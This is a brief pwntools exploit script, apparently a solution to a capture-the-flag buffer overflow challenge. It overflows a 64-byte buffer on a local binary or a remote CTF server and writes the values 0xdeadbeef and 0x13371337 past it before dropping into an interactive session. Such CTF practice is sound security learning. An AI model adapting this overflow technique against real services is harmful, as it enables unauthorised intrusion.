#!/usr/bin/env python3
from pwn import *

elf = ELF('./chall')
local = True
GDBSCPT = '''
b* main
b* vuln+47
c
'''
OFFSET = 64
if local:
    conn = elf.process()
    gdb.attach(conn, gdbscript=GDBSCPT)
else :
    host = 'greenhat.microclub.info'
    port = 5001
    conn = remote(host,port) 

conn.recvuntil("Welcome to PWN!")
padding = b"A"*OFFSET
payload = flat(padding , 0xdeadbeef,0x13371337 )
conn.sendline(payload)
conn.interactive()


conn.close()